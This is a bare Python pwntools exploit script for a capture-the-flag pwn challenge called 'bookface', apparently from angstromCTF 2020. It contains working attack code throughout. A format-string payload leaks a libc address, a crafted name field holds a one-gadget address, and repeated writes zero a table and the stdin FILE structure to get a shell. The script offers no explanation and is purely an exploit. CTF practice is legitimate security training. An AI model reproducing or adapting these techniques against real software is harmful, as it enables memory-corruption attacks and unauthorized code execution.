from pwn import *
import random

e = ELF("./bookface")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn.2020.chall.actf.co", 20733)
else:
  #p = process(e.path)
  p = remote("localhost", 1337)

uid = random.randint(0, 0x100 ** 4)

print(uid)

p.sendlineafter(":", str(uid))
p.sendlineafter("name?", "A")
p.sendlineafter(">", "4")

p.sendlineafter(":", str(uid))
p.recvuntil("brief survey.")
p.sendlineafter(":", ";%7$llx;")
p.sendlineafter("Support:", "a")

p.recvuntil(";")
leak = int(p.recvuntil(";", drop=True), 16) - 0x00007fc97c08f53c + 0x00007fc97c00b000

print(hex(leak))

for i in range(4):
  p.sendlineafter(":", "10")

uid += 1
p.sendlineafter(">", "4")
p.sendlineafter(":", str(uid))

pay = ""
for i in range(10):
  if i == 5:
    pay += p64(leak + 0xf02a4)
  else:
    pay += p64(i)
p.sendlineafter("name?", pay)

old = 0
def zero(addr):
  global old
  p.sendlineafter(">", "1")
  p.sendlineafter("?", str((addr - old) // 8))
  p.sendlineafter(">", "4")
  p.sendlineafter(":", str(uid))
  p.recvuntil("brief survey.")

  for i in range(4):
    p.sendlineafter(":", "A")

  p.recvuntil("Content")

  for i in range(4):
    p.sendlineafter(":", "A")

  old = addr

tbl = leak + 0x7f92843620a0 - 0x00007f9283f9e000

for i in range(16):
  zero(tbl + 8 * i)

ui.pause()

zero(leak + libc.symbols["_IO_2_1_stdin_"] + 0xd8)

p.interactive()
